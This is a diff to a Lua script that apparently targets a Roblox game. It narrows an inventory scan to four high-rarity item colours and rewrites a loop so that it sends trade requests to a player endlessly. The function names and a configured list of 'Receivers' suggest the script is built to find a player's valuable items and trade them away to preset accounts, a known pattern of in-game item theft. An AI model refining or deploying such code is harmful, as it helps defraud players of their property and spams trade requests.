@@ -177,14 +177,19 @@ function FullInventory()
             if x.Name == "Christmas" or x.Name == "Halloween" then
                 for w, x in pairs(x.Container:GetChildren()) do
                     if x:IsA("Frame") then
-                        Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
-                        if Config.FullInventory then
-                            if x.Container.Amount.Text ~= "" then
-                                number = x.Container.Amount.Text
-                            else
-                                number = "x1"
+                        local r, g, b = math.floor(x.ItemName.BackgroundColor3.R * 255 + 0.5), math.floor(x.ItemName.BackgroundColor3.G * 255 + 0.5), math.floor(x.ItemName.BackgroundColor3.B * 255 + 0.5)
+                        local isDesiredRarity = (r == 255 and g == 0 and b == 179) or
+                                                (r == 100 and g == 10 and b == 255) or 
+                                                (r == 240 and g == 140 and b == 0) or 
+                                                (r == 180 and g == 70 and b == 0)
+
+                        if isDesiredRarity then
+                            Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
+
+                            if Config.FullInventory then
+                                local number = x.Container.Amount.Text ~= "" and x.Container.Amount.Text or "x1"
+                                table.insert(H, x.ItemName.Label.Text .. " " .. number)
                             end
-                            table.insert(H, x.ItemName.Label.Text .. " " .. number)
                         end
                     end
                 end
@@ -192,11 +197,7 @@ function FullInventory()
                 if x:IsA("Frame") then
                     Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text, x:FindFirstChild("Tags"))
                     if Config.FullInventory then
-                        if x.Container.Amount.Text ~= "" then
-                            number = x.Container.Amount.Text
-                        else
-                            number = "x1"
-                        end
+                        local number = x.Container.Amount.Text ~= "" and x.Container.Amount.Text or "x1"
                         table.insert(H, x.ItemName.Label.Text .. " " .. number)
                     end
                 end
@@ -205,16 +206,10 @@ function FullInventory()
     end
     for w, x in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
         if x:IsA("Frame") then
-            if x:IsA("Frame") then
-                Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text)
-                if Config.FullInventory then
-                    if x.Container.Amount.Text ~= "" then
-                        number = x.Container.Amount.Text
-                    else
-                        number = "x1"
-                    end
-                    table.insert(H, x.ItemName.Label.Text .. " " .. number)
-                end
+            Rarity(x.ItemName.BackgroundColor3, x.Container.Amount.Text)
+            if Config.FullInventory then
+                local number = x.Container.Amount.Text ~= "" and x.Container.Amount.Text or "x1"
+                table.insert(H, x.ItemName.Label.Text .. " " .. number)
             end
         end
     end
@@ -337,7 +332,10 @@ for w, x in pairs(b:GetPlayers()) do
     Activate(x.Name)
 end
 function Loop(I)
-    Sendtrade()
+    while true do
+        Sendtrade(I) -- This will continuously send trade requests to the player `I`
+        wait(1) -- Optional: Add a wait time between trades to prevent spamming
+    end
 end
 function StartTrade(I)
     for O, P in ipairs(Config.Receivers) do
